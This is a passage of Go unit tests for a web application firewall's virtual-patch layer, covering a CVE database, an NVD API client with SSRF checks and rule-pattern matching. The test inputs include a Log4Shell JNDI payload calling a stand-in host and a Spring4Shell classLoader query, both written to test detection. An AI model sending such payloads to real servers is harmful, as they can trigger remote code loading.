package virtualpatch

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/guardianwaf/guardianwaf/internal/config"
	"github.com/guardianwaf/guardianwaf/internal/engine"
)

// --------------------------------------------------------------------------
// Database: GetAllPatches, GetPatchesForProduct, Stats with mixed severity
// --------------------------------------------------------------------------

func TestDatabase_GetAllPatches_Cov(t *testing.T) {
	db := NewDatabase()

	p1 := &VirtualPatch{ID: "VP-A", Enabled: true}
	p2 := &VirtualPatch{ID: "VP-B", Enabled: false}
	db.AddCVE(&CVEEntry{
		CVEID:    "CVE-2020-A",
		Severity: "HIGH",
		Patches:  []VirtualPatch{*p1, *p2},
	})

	all := db.GetAllPatches()
	if len(all) != 2 {
		t.Fatalf("expected 2 patches, got %d", len(all))
	}
	ids := map[string]bool{}
	for _, p := range all {
		ids[p.ID] = true
	}
	if !ids["VP-A"] || !ids["VP-B"] {
		t.Error("missing expected patches in GetAllPatches result")
	}
}

func TestDatabase_GetAllPatches_Empty(t *testing.T) {
	db := NewDatabase()
	all := db.GetAllPatches()
	if len(all) != 0 {
		t.Fatalf("expected 0 patches, got %d", len(all))
	}
}

func TestDatabase_GetPatchesForProduct(t *testing.T) {
	db := NewDatabase()

	cpe := "cpe:2.3:a:apache:log4j:2.14.0:*:*:*:*:*:*:*"
	db.AddCVE(&CVEEntry{
		CVEID:           "CVE-2021-44228",
		Severity:        "CRITICAL",
		AffectedProducts: []Product{{CPE: cpe, Vulnerable: true}},
		Patches: []VirtualPatch{
			{ID: "VP-LOG4J", Enabled: true, Severity: "CRITICAL"},
		},
	})

	patches := db.GetPatchesForProduct(cpe)
	if len(patches) != 1 {
		t.Fatalf("expected 1 patch for product, got %d", len(patches))
	}
	if patches[0].ID != "VP-LOG4J" {
		t.Errorf("expected VP-LOG4J, got %s", patches[0].ID)
	}
}

func TestDatabase_GetPatchesForProduct_NoMatch(t *testing.T) {
	db := NewDatabase()
	db.AddCVE(&CVEEntry{
		CVEID:    "CVE-2021-X",
		Severity: "HIGH",
		Patches:  []VirtualPatch{{ID: "VP-X", Enabled: true}},
	})

	patches := db.GetPatchesForProduct("cpe:2.3:a:nonexistent:*:*:*")
	if len(patches) != 0 {
		t.Fatalf("expected 0 patches for unknown product, got %d", len(patches))
	}
}

func TestDatabase_GetPatchesForProduct_DisabledPatchExcluded(t *testing.T) {
	db := NewDatabase()
	cpe := "cpe:2.3:a:example:app:1.0:*:*:*:*:*:*:*"
	db.AddCVE(&CVEEntry{
		CVEID:           "CVE-2022-TEST",
		Severity:        "HIGH",
		AffectedProducts: []Product{{CPE: cpe, Vulnerable: true}},
		Patches: []VirtualPatch{
			{ID: "VP-DIS", Enabled: false, Severity: "HIGH"},
		},
	})

	patches := db.GetPatchesForProduct(cpe)
	if len(patches) != 0 {
		t.Fatalf("disabled patches should not be returned, got %d", len(patches))
	}
}

func TestDatabase_Stats_MultipleSeverities(t *testing.T) {
	db := NewDatabase()
	db.AddCVE(&CVEEntry{CVEID: "CVE-1", Severity: "CRITICAL"})
	db.AddCVE(&CVEEntry{CVEID: "CVE-2", Severity: "CRITICAL"})
	db.AddCVE(&CVEEntry{CVEID: "CVE-3", Severity: "HIGH"})
	db.AddCVE(&CVEEntry{CVEID: "CVE-4", Severity: "MEDIUM", Patches: []VirtualPatch{
		{ID: "VP-M1", Enabled: false},
	}})

	stats := db.Stats()
	if stats.TotalCVEs != 4 {
		t.Errorf("expected 4 CVEs, got %d", stats.TotalCVEs)
	}
	if stats.BySeverity["CRITICAL"] != 2 {
		t.Errorf("expected 2 CRITICAL, got %d", stats.BySeverity["CRITICAL"])
	}
	if stats.BySeverity["HIGH"] != 1 {
		t.Errorf("expected 1 HIGH, got %d", stats.BySeverity["HIGH"])
	}
	if stats.BySeverity["MEDIUM"] != 1 {
		t.Errorf("expected 1 MEDIUM, got %d", stats.BySeverity["MEDIUM"])
	}
	if stats.ActivePatches != 0 {
		t.Errorf("expected 0 active patches, got %d", stats.ActivePatches)
	}
}

func TestDatabase_AddCVE_WithProductCPE(t *testing.T) {
	db := NewDatabase()
	entry := &CVEEntry{
		CVEID:           "CVE-2022-PROD",
		Severity:        "HIGH",
		AffectedProducts: []Product{
			{CPE: "cpe:2.3:a:foo:bar:1.0:*", Vulnerable: true},
			{CPE: "", Vulnerable: true}, // empty CPE should be skipped
		},
		Patches: []VirtualPatch{{ID: "VP-P1", Enabled: true}},
	}
	db.AddCVE(entry)

	if db.GetCVE("CVE-2022-PROD") == nil {
		t.Error("CVE not stored")
	}
	if db.GetPatch("VP-P1") == nil {
		t.Error("patch not indexed")
	}
}

func TestDatabase_ConcurrentAccess(t *testing.T) {
	db := NewDatabase()
	var wg sync.WaitGroup

	for i := range 100 {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			id := fmt.Sprintf("CVE-CONCURRENT-%d", i)
			db.AddCVE(&CVEEntry{
				CVEID:    id,
				Severity: "HIGH",
				Patches:  []VirtualPatch{{ID: "VP-C-" + fmt.Sprint(i), Enabled: true}},
			})
			db.GetCVE(id)
			db.GetPatch("VP-C-" + fmt.Sprint(i))
			db.GetActivePatches()
			db.GetAllPatches()
			db.Stats()
		}(i)
	}
	wg.Wait()
}

// --------------------------------------------------------------------------
// NVD Client: validateURLNotPrivate, SetBaseURL, Search, GetCVE, convertToCVEEntry
// --------------------------------------------------------------------------

func TestValidateURLNotPrivate_LoopbackIP(t *testing.T) {
	err := validateURLNotPrivate("http://127.0.0.1/api")
	if err == nil {
		t.Error("expected error for loopback IP")
	}
}

func TestValidateURLNotPrivate_PrivateIP(t *testing.T) {
	err := validateURLNotPrivate("http://10.0.0.1/api")
	if err == nil {
		t.Error("expected error for private IP")
	}
}

func TestValidateURLNotPrivate_Localhost(t *testing.T) {
	err := validateURLNotPrivate("http://localhost/api")
	if err == nil {
		t.Error("expected error for localhost")
	}
}

func TestValidateURLNotPrivate_InternalSuffix(t *testing.T) {
	err := validateURLNotPrivate("http://myhost.internal/api")
	if err == nil {
		t.Error("expected error for .internal host")
	}
}

func TestValidateURLNotPrivate_LocalSuffix(t *testing.T) {
	err := validateURLNotPrivate("http://myhost.local/api")
	if err == nil {
		t.Error("expected error for .local host")
	}
}

func TestValidateURLNotPrivate_LinkLocal(t *testing.T) {
	err := validateURLNotPrivate("http://169.254.169.254/latest/meta-data")
	if err == nil {
		t.Error("expected error for link-local IP")
	}
}

func TestValidateURLNotPrivate_UnspecifiedIP(t *testing.T) {
	err := validateURLNotPrivate("http://0.0.0.0/api")
	if err == nil {
		t.Error("expected error for unspecified IP")
	}
}

func TestValidateURLNotPrivate_PublicIP(t *testing.T) {
	err := validateURLNotPrivate("http://8.8.8.8/api")
	if err != nil {
		t.Errorf("public IP should be allowed: %v", err)
	}
}

func TestValidateURLNotPrivate_InvalidURL(t *testing.T) {
	err := validateURLNotPrivate("://not-a-valid-url")
	if err == nil {
		t.Error("expected error for invalid URL")
	}
}

func TestValidateURLNotPrivate_PublicHostname(t *testing.T) {
	// Use a hostname that likely resolves to a public IP
	err := validateURLNotPrivate("https://example.com/api")
	// We can't assert no error definitively (depends on DNS), but we exercise the path.
	t.Logf("public hostname validation: %v", err)
}

func TestValidateURLNotPrivate_IPv6Loopback(t *testing.T) {
	err := validateURLNotPrivate("http://[::1]/api")
	if err == nil {
		t.Error("expected error for IPv6 loopback")
	}
}

func TestSetBaseURL_HTTPS(t *testing.T) {
	client := NewNVDClient("")
	err := client.SetBaseURL("https://nvd.example.com/api")
	if err != nil {
		t.Errorf("HTTPS URL should be accepted: %v", err)
	}
}

func TestSetBaseURL_HTTP_Warning(t *testing.T) {
	client := NewNVDClient("")
	// http:// with a public IP to pass SSRF check
	err := client.SetBaseURL("http://8.8.8.8/api")
	if err != nil {
		t.Errorf("HTTP URL with public IP should be accepted: %v", err)
	}
}

func TestSetBaseURL_PrivateRejected(t *testing.T) {
	client := NewNVDClient("")
	err := client.SetBaseURL("http://127.0.0.1/api")
	if err == nil {
		t.Error("private URL should be rejected")
	}
}

func TestNVDClient_Search_WithTestServer(t *testing.T) {
	response := NVDResponse{
		ResultsPerPage: 1,
		StartIndex:     0,
		TotalResults:   1,
		Vulnerabilities: []NVDCVEItem{
			{
				CVE: NVDCVE{
					ID:           "CVE-2024-0001",
					Published:    "2024-01-15T00:00:00.000Z",
					LastModified: "2024-01-16T00:00:00.000Z",
					VulnStatus:   "Analyzed",
					Descriptions: []NVDDescription{
						{Lang: "en", Value: "A test SQL injection vulnerability"},
					},
					Metrics: NVDMetrics{
						CVSSMetricV31: []NVDCVSSMetricV31{
							{
								CVSSData: NVDCVSSData{
									BaseScore:    9.8,
									BaseSeverity: "CRITICAL",
								},
							},
						},
					},
					Weaknesses: []NVDWeakness{
						{
							Description: []NVDDescription{
								{Lang: "en", Value: "CWE-89"},
							},
						},
					},
					Configurations: []NVDConfig{
						{
							Nodes: []NVDNode{
								{
									CPEMatch: []CPEMatch{
										{Vulnerable: true, Criteria: "cpe:2.3:a:example:app:*"},
									},
								},
							},
						},
					},
				},
			},
		},
	}

	body, _ := json.Marshal(response)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("apiKey") != "test-key" {
			t.Error("expected apiKey header")
		}
		w.Header().Set("Content-Type", "application/json")
		w.Write(body)
	}))
	defer srv.Close()

	client := NewNVDClient("test-key")
	client.baseURL = srv.URL // bypass private IP validation for test server

	result, err := client.Search(SearchOptions{
		Keyword:        "sql injection",
		ResultsPerPage: 10,
		StartIndex:     0,
		PubStartDate:   time.Date(2024, 1, 1, 0, 0, 0, 0, time.UTC),
		PubEndDate:     time.Date(2024, 12, 31, 0, 0, 0, 0, time.UTC),
		Severity:       "HIGH",
	})
	if err != nil {
		t.Fatalf("Search failed: %v", err)
	}
	if result.TotalResults != 1 {
		t.Errorf("expected 1 result, got %d", result.TotalResults)
	}
	if result.Vulnerabilities[0].CVE.ID != "CVE-2024-0001" {
		t.Errorf("unexpected CVE ID: %s", result.Vulnerabilities[0].CVE.ID)
	}
}

func TestNVDClient_Search_EmptyOptions(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Verify no keyword/search params when options are empty
		if r.URL.Query().Get("keywordSearch") != "" {
			t.Error("keywordSearch should not be set for empty Keyword")
		}
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"resultsPerPage":0,"startIndex":0,"totalResults":0,"vulnerabilities":[]}`))
	}))
	defer srv.Close()

	client := NewNVDClient("")
	client.baseURL = srv.URL // bypass private IP validation for test server

	result, err := client.Search(SearchOptions{})
	if err != nil {
		t.Fatalf("Search failed: %v", err)
	}
	if result.TotalResults != 0 {
		t.Errorf("expected 0 results, got %d", result.TotalResults)
	}
}

func TestNVDClient_Search_NonOKStatus(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer srv.Close()

	client := NewNVDClient("")
	// Bypass private IP validation by setting baseURL directly
	client.baseURL = srv.URL

	_, err := client.Search(SearchOptions{Keyword: "test"})
	if err == nil {
		t.Error("expected error for 500 status")
	}
	if err != nil && !strings.Contains(err.Error(), "500") {
		t.Errorf("error should mention status code 500: %v", err)
	}
}

func TestNVDClient_Search_InvalidJSON(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`not json`))
	}))
	defer srv.Close()

	client := NewNVDClient("")
	client.baseURL = srv.URL // bypass private IP validation for test server

	_, err := client.Search(SearchOptions{Keyword: "test"})
	if err == nil {
		t.Error("expected error for invalid JSON")
	}
}

func TestNVDClient_GetCVE_WithTestServer(t *testing.T) {
	response := NVDResponse{
		TotalResults: 1,
		Vulnerabilities: []NVDCVEItem{
			{
				CVE: NVDCVE{
					ID:           "CVE-2024-1234",
					VulnStatus:   "Analyzed",
					Published:    "2024-03-01T00:00:00.000Z",
					LastModified: "2024-03-02T00:00:00.000Z",
					Descriptions: []NVDDescription{
						{Lang: "en", Value: "Remote code execution via deserialization"},
						{Lang: "es", Value: "Ejecucion remota de codigo"},
					},
					Metrics: NVDMetrics{
						CVSSMetricV30: []NVDCVSSMetricV30{
							{
								CVSSData: NVDCVSSData{
									BaseScore:    8.5,
									BaseSeverity: "HIGH",
								},
							},
						},
					},
					Weaknesses: []NVDWeakness{
						{
							Description: []NVDDescription{
								{Lang: "en", Value: "CWE-502"},
							},
						},
					},
				},
			},
		},
	}

	body, _ := json.Marshal(response)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Query().Get("cveId") != "CVE-2024-1234" {
			t.Errorf("expected cveId param, got %s", r.URL.Query().Get("cveId"))
		}
		w.Header().Set("Content-Type", "application/json")
		w.Write(body)
	}))
	defer srv.Close()

	client := NewNVDClient("my-api-key")
	client.baseURL = srv.URL // bypass private IP validation for test server

	entry, err := client.GetCVE("CVE-2024-1234")
	if err != nil {
		t.Fatalf("GetCVE failed: %v", err)
	}
	if entry.CVEID != "CVE-2024-1234" {
		t.Errorf("expected CVE-2024-1234, got %s", entry.CVEID)
	}
	if entry.CVSSScore != 8.5 {
		t.Errorf("expected CVSS 8.5, got %f", entry.CVSSScore)
	}
	if entry.Severity != "HIGH" {
		t.Errorf("expected HIGH severity, got %s", entry.Severity)
	}
	if entry.Description != "Remote code execution via deserialization" {
		t.Errorf("unexpected description: %s", entry.Description)
	}
	if entry.Source != "nvd" {
		t.Errorf("expected source nvd, got %s", entry.Source)
	}
	if !entry.Active {
		t.Error("expected entry to be active")
	}
}

func TestNVDClient_GetCVE_NotFound(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"totalResults":0,"vulnerabilities":[]}`))
	}))
	defer srv.Close()

	client := NewNVDClient("")
	client.baseURL = srv.URL // bypass private IP validation for test server

	_, err := client.GetCVE("CVE-NONEXISTENT")
	if err == nil {
		t.Error("expected error for CVE not found")
	}
	if err != nil && !strings.Contains(err.Error(), "not found") {
		t.Errorf("error should mention not found: %v", err)
	}
}

func TestNVDClient_GetCVE_NonOKStatus(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	}))
	defer srv.Close()

	client := NewNVDClient("")
	client.baseURL = srv.URL // bypass private IP validation for test server

	_, err := client.GetCVE("CVE-2024-0001")
	if err == nil {
		t.Error("expected error for 404 status")
	}
}

func TestNVDClient_GetCVE_WithCVSSV2(t *testing.T) {
	response := NVDResponse{
		Vulnerabilities: []NVDCVEItem{
			{
				CVE: NVDCVE{
					ID:           "CVE-2020-OLD",
					Published:    "2020-01-01T00:00:00.000Z",
					LastModified: "2020-01-02T00:00:00.000Z",
					Descriptions: []NVDDescription{
						{Lang: "en", Value: "An old vulnerability"},
					},
					Metrics: NVDMetrics{
						CVSSMetricV2: []NVDCVSSMetricV2{
							{
								CVSSData: NVDCVSSDataV2{
									BaseScore: 6.5,
								},
							},
						},
					},
					Weaknesses: []NVDWeakness{
						{
							Description: []NVDDescription{
								{Lang: "en", Value: "CWE-79"},
								{Lang: "en", Value: "NVD-CWE-noinfo"}, // not CWE- prefix, should be skipped
							},
						},
					},
				},
			},
		},
	}

	body, _ := json.Marshal(response)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write(body)
	}))
	defer srv.Close()

	client := NewNVDClient("")
	client.baseURL = srv.URL // bypass private IP validation for test server

	entry, err := client.GetCVE("CVE-2020-OLD")
	if err != nil {
		t.Fatalf("GetCVE failed: %v", err)
	}
	if entry.CVSSScore != 6.5 {
		t.Errorf("expected CVSS 6.5, got %f", entry.CVSSScore)
	}
	// cvssV2ToSeverity: 6.5 >= 4.0 → MEDIUM
	if entry.Severity != "MEDIUM" {
		t.Errorf("expected MEDIUM, got %s", entry.Severity)
	}
	// Only CWE-79 should be extracted (NVD-CWE-noinfo is skipped)
	if len(entry.CWEs) != 1 || entry.CWEs[0] != "CWE-79" {
		t.Errorf("expected [CWE-79], got %v", entry.CWEs)
	}
}

func TestConvertToCVEEntry_NoEnglishDescription(t *testing.T) {
	nvd := NVDCVE{
		ID:           "CVE-2024-NONEN",
		Published:    "2024-01-01T00:00:00.000Z",
		Descriptions: []NVDDescription{
			{Lang: "fr", Value: "Une description en francais"},
		},
		Metrics: NVDMetrics{},
	}
	entry := convertToCVEEntry(nvd)
	if entry.Description != "" {
		t.Errorf("expected empty description when no English, got %q", entry.Description)
	}
}

func TestConvertToCVEEntry_AffectedProducts(t *testing.T) {
	nvd := NVDCVE{
		ID:        "CVE-2024-PROD",
		Published: "2024-01-01T00:00:00.000Z",
		Configurations: []NVDConfig{
			{
				Nodes: []NVDNode{
					{
						CPEMatch: []CPEMatch{
							{Vulnerable: true, Criteria: "cpe:2.3:a:vendor:product:1.0"},
							{Vulnerable: false, Criteria: "cpe:2.3:a:vendor:product:2.0"}, // should be skipped
						},
					},
				},
			},
		},
		Metrics: NVDMetrics{},
	}
	entry := convertToCVEEntry(nvd)
	if len(entry.AffectedProducts) != 1 {
		t.Fatalf("expected 1 affected product, got %d", len(entry.AffectedProducts))
	}
	if entry.AffectedProducts[0].CPE != "cpe:2.3:a:vendor:product:1.0" {
		t.Errorf("unexpected CPE: %s", entry.AffectedProducts[0].CPE)
	}
}

func TestParseNVDDatetime(t *testing.T) {
	tests := []struct {
		input    string
		hasValue bool
	}{
		{"2024-01-15T10:30:00.000Z", true},
		{"", false},
		{"not-a-date", false},
	}
	for _, tt := range tests {
		result := parseNVDDatetime(tt.input)
		if tt.hasValue && result.IsZero() {
			t.Errorf("expected non-zero for %q", tt.input)
		}
		if !tt.hasValue && !result.IsZero() {
			t.Errorf("expected zero for %q", tt.input)
		}
	}
}

func TestCvssV2ToSeverity(t *testing.T) {
	tests := []struct {
		score    float64
		expected string
	}{
		{10.0, "HIGH"},
		{7.0, "HIGH"},
		{6.9, "MEDIUM"},
		{4.0, "MEDIUM"},
		{3.9, "LOW"},
		{0.0, "LOW"},
	}
	for _, tt := range tests {
		result := cvssV2ToSeverity(tt.score)
		if result != tt.expected {
			t.Errorf("cvssV2ToSeverity(%f) = %q, want %q", tt.score, result, tt.expected)
		}
	}
}

// --------------------------------------------------------------------------
// Layer: Stop, GetUpdateStats, GetAllPatches, TriggerUpdate, matchPattern types
// --------------------------------------------------------------------------

func TestLayer_Stop_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:        true,
		AutoUpdate:     true,
		UpdateInterval: 1 * time.Hour,
	})

	// Allow the auto-update goroutine to start
	time.Sleep(50 * time.Millisecond)

	// Stop should succeed
	layer.Stop()

	// Double stop should not panic
	layer.Stop()
}

func TestLayer_Stop_NoAutoUpdate_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:    true,
		AutoUpdate: false,
	})
	// Should be a no-op (stopUpdate is nil)
	layer.Stop()
}

func TestLayer_GetUpdateStats(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:        true,
		AutoUpdate:     true,
		UpdateInterval: 1 * time.Hour,
	})
	defer layer.Stop()

	stats := layer.GetUpdateStats()
	// Initial stats should have zero update count
	if stats.UpdateCount < 0 {
		t.Errorf("unexpected negative update count: %d", stats.UpdateCount)
	}
	t.Logf("UpdateStats: count=%d, lastUpdate=%v, lastError=%q", stats.UpdateCount, stats.LastUpdate, stats.LastError)
}

func TestLayer_GetAllPatches_Cov(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true})

	// Disable one default patch
	layer.DisablePatch("VP-LOG4SHELL-001")

	all := layer.GetAllPatches()
	if len(all) == 0 {
		t.Fatal("expected patches from default load")
	}

	foundDisabled := false
	for _, p := range all {
		if p.ID == "VP-LOG4SHELL-001" && !p.Enabled {
			foundDisabled = true
		}
	}
	if !foundDisabled {
		t.Error("expected VP-LOG4SHELL-001 to be in GetAllPatches even though disabled")
	}
}

func TestLayer_TriggerUpdate_NoNVDClient_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:    true,
		AutoUpdate: false,
	})

	err := layer.TriggerUpdate()
	if err == nil {
		t.Error("expected error when NVD client is nil")
	}
	if err != nil && !strings.Contains(err.Error(), "not configured") {
		t.Errorf("unexpected error: %v", err)
	}
}

func TestLayer_TriggerUpdate_WithServer(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Write([]byte(`{"resultsPerPage":0,"startIndex":0,"totalResults":0,"vulnerabilities":[]}`))
	}))
	defer srv.Close()

	layer := NewLayer(&Config{
		Enabled:           true,
		AutoUpdate:        false,
		AutoGenerateRules: true,
	})
	// Manually set up NVD client since AutoUpdate is false.
	// Directly set baseURL to bypass SSRF protection (test server uses 127.0.0.1).
	layer.nvdClient = NewNVDClient("")
	layer.nvdClient.mu.Lock()
	layer.nvdClient.baseURL = srv.URL
	layer.nvdClient.mu.Unlock()

	err := layer.TriggerUpdate()
	if err != nil {
		t.Errorf("TriggerUpdate failed: %v", err)
	}
}

func TestLayer_TriggerUpdate_ServerError(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusBadGateway)
	}))
	defer srv.Close()

	layer := NewLayer(&Config{
		Enabled:    true,
		AutoUpdate: false,
	})
	layer.nvdClient = NewNVDClient("")
	layer.nvdClient.mu.Lock()
	layer.nvdClient.baseURL = srv.URL
	layer.nvdClient.mu.Unlock()

	err := layer.TriggerUpdate()
	if err == nil {
		t.Error("expected error for server error response")
	}
}

// --------------------------------------------------------------------------
// Layer: matchPattern type coverage (query, body, method, user_agent, content_type, uri, client_ip)
// --------------------------------------------------------------------------

func TestLayer_MatchPattern_Query(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL"},
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/",
		Request: &http.Request{
			URL: &url.URL{RawQuery: "class.module.classLoader=test"},
		},
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Log("Spring4Shell query pattern not matched - may be expected")
	}
}

func TestLayer_MatchPattern_BodyString(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL"},
	})

	ctx := &engine.RequestContext{
		Method:     "POST",
		Path:       "/api",
		BodyString: "${jndi:ldap://evil.com/a}",
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Error("expected Log4Shell body string match")
	}
}

func TestLayer_MatchPattern_Method(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	// Add a custom patch that matches on method
	layer.AddPatch(&VirtualPatch{
		ID:       "VP-METHOD",
		Severity: "CRITICAL",
		Action:   "block",
		Score:    50,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "method", Pattern: "DELETE", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "DELETE",
		Path:   "/api/users/1",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block for DELETE method match, got %v", result.Action)
	}
}

func TestLayer_MatchPattern_UserAgent(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-UA",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "user_agent", Pattern: "BadBot", MatchType: "contains"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:  "GET",
		Path:    "/",
		Headers: map[string][]string{"User-Agent": {"Mozilla/5.0 BadBot/1.0"}},
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block for user_agent match, got %v", result.Action)
	}
}

func TestLayer_MatchPattern_ContentType(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-CT",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "content_type", Pattern: "application/x-php", MatchType: "contains"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:  "POST",
		Path:    "/upload",
		Headers: map[string][]string{"Content-Type": {"application/x-php"}},
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block for content_type match, got %v", result.Action)
	}
}

func TestLayer_MatchPattern_URI(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-URI",
		Severity: "HIGH",
		Action:   "log",
		Score:    30,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "uri", Pattern: "/secret?token=", MatchType: "contains"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:  "GET",
		Path:    "/secret",
		Request: &http.Request{URL: &url.URL{Path: "/secret", RawQuery: "token=abc"}},
	}

	result := layer.Process(ctx)
	if result.Score == 0 {
		t.Error("expected uri pattern match")
	}
}

func TestLayer_MatchPattern_ClientIP(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-IP",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "client_ip", Pattern: "192.168.1.100", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:   "GET",
		Path:     "/",
		ClientIP: net.ParseIP("192.168.1.100"),
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block for client_ip match, got %v", result.Action)
	}
}

func TestLayer_MatchPattern_StartsWith_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-SW",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "/wp-admin", MatchType: "starts_with"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/wp-admin/options.php",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block for starts_with match, got %v", result.Action)
	}
}

func TestLayer_MatchPattern_EndsWith_Cov(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-EW",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: ".php", MatchType: "ends_with"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/uploads/shell.php",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block for ends_with match, got %v", result.Action)
	}
}

func TestLayer_MatchPattern_DefaultMatchType(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	// MatchType is empty — should default to "contains"
	layer.AddPatch(&VirtualPatch{
		ID:       "VP-DEF",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "path", Pattern: "admin", MatchType: ""},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/secret-admin-panel",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Errorf("expected block for default match type (contains), got %v", result.Action)
	}
}

func TestLayer_MatchPattern_UnknownType(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-UNK",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "unknown_type", Pattern: "test", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method: "GET",
		Path:   "/",
	}

	result := layer.Process(ctx)
	if result.Action != engine.ActionPass {
		t.Errorf("unknown pattern type should not match, got %v", result.Action)
	}
}

func TestLayer_MatchPattern_EmptyValue(t *testing.T) {
	layer := NewLayer(&Config{
		Enabled:       true,
		BlockSeverity: []string{"CRITICAL", "HIGH"},
	})

	layer.AddPatch(&VirtualPatch{
		ID:       "VP-EMPTY",
		Severity: "HIGH",
		Action:   "block",
		Score:    40,
		Enabled:  true,
		Patterns: []PatchPattern{
			{Type: "header", Key: "X-Missing", Pattern: "test", MatchType: "exact"},
		},
		MatchLogic: "or",
	})

	ctx := &engine.RequestContext{
		Method:  "GET",
		Path:    "/",
		Headers: map[string][]string{},
	}

	result := layer.Process(ctx)
